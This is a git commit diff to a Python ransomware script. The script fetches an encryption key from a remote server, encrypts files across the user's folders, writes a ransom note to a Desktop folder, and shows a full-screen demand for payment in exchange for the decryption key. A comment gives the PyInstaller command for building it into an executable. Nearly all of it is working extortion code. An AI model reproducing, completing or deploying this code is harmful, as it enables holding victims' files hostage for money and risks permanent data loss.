beb4d6cb756d6d143b5fac70d1ef39fdaa849b55
Drew York <119648808+dre-yo@users.noreply.github.com>
2023-04-11 21:01:48 -0700

    fixed issue of decrypt on some invalid inputs

--- encrypt.py
+++ encrypt.py
@@ -4,12 +4,14 @@ import tkinter as tk
 import socket
 from tkinter import *
 from tkinter import messagebox
+from os import path
+import shutil
 
 #python -m PyInstaller --onefile -w encrypt.py
 
 #get key from server
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-IP_ADDRESS = 'SERVER IP HERE'
+IP_ADDRESS = 'Server IP here'
 PORT = 9090
 client_socket.connect((IP_ADDRESS, PORT))
 key = client_socket.recv(1024)
@@ -21,7 +23,7 @@ EXCLUDED_DIRECTORIES = ('Program Files',
                         'Windows',
                         '$Recycle.Bin',
                         'AppData',
-                        #'paths',
+                        'ransom',
         )
 
 EXTENSIONS = ( 
@@ -65,48 +67,64 @@ file_paths = find_files()
 
 
 def encrypt_all():
+    desktop_path = os.path.expanduser("~/Desktop")
+    new_directory = "ransom"
+    new_directory = os.path.join(desktop_path, new_directory)
+    os.mkdir(new_directory)
+    ransom_note = "ransom.txt"
+    ransom_path = os.path.join(new_directory, ransom_note)
     for file in file_paths:
         current_file = file.strip()
         encrypt_file(current_file)
-
-
+    with open(ransom_path, "w") as ransom_file:
+        ransom_file.write("You will recive your decryption key once you have paid the rasom\n")
+        ransom_file.write("Do not attempt to decrypt on your own")
+    
 def decryption_screen():
     root = tk.Tk()
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
     gap = (screen_height/50)
     root.geometry(f"{screen_width}x{screen_height}")
-    root.configure(background="black")
+    root.configure(background="blue")
     labe1 = tk.Label(root, text="YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED")
     labe1.config(font=('tohoma', int(gap)))
-    labe1.config(background='black',foreground='red')
+    labe1.config(background='blue',foreground='white')
     labe1.pack(anchor='n', ipady=20)
 
-    img = tk.PhotoImage(file="icon-red-lock.png")
+
+    img = tk.PhotoImage(file="lock.png")
     img = img.subsample(4)
     labe2 = tk.Label(root, image=img)
     labe2.pack(anchor='n', ipady=20)
+    
+
 
     labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
     labe3.config(font=('tahoma', int(gap)))
-    labe3.config(background="black", foreground="red")
+    labe3.config(background="blue", foreground="white")
     labe3.pack(anchor='n', ipady=20)
 
     labe4 = tk.Label(root, text="You will recieve the key once you have paid the ransom.\nInput the key below:")
     labe4.config(font=('tahoma',int(gap)))
-    labe4.config(background='black',foreground='red')
+    labe4.config(background='blue',foreground='white')
     labe4.pack(anchor='n', ipady=20)
     
+
     def decrypt_all():
+
         try:
             user_input = entry.get()
             if user_input != key.decode():
                 raise ValueError("Incorrect key")
         except ValueError as e:
             messagebox.showerror("Error", e)
+            return
+
+
 
         def decrypt_file(filename):
-            fernet = Fernet(key)
+            fernet = Fernet(user_input)
             with open(filename, "rb") as file:
                 file_content = file.read()
             decrypted_content = fernet.decrypt(file_content)
@@ -117,12 +135,17 @@ def decryption_screen():
         for file in file_paths:
             decrypt_file(file)
         messagebox.showinfo("Success", "Your Files have been decrypted!")
+        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+        ransom_note_dir = "ransom"
+        ransom_note_path = os.path.join(desktop_path, ransom_note_dir)
+        shutil.rmtree(ransom_note_path)
         root.destroy()
+
 
     entry = tk.Entry(root, width=int(screen_width/10))
     entry.pack(anchor='n', ipady=20)
 
-    canvas1 = tk.Canvas(root, bg='black', highlightthickness=0, height=20, width=screen_width)
+    canvas1 = tk.Canvas(root, bg='blue', highlightthickness=0, height=20, width=screen_width)
     canvas1.pack()
 
     key_submit = tk.Button(root, text='Submit', command=decrypt_all)
@@ -134,10 +157,13 @@ def decryption_screen():
 
 
 
-
-#TODO if already encrypted only show decryption menu, else: encrypt then show menu
 if __name__ == '__main__':
-    #if path.exists("paths") is False:
-    #    os.mkdir("paths")
-    encrypt_all()
-    decryption_screen()
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    ransom_note_directory = "ransom"
+    ransom_note_path = os.path.join(desktop_path, ransom_note_directory)
+
+    if os.path.exists(ransom_note_path) is False:
+        encrypt_all()
+        decryption_screen()
+    else:
+        decryption_screen()
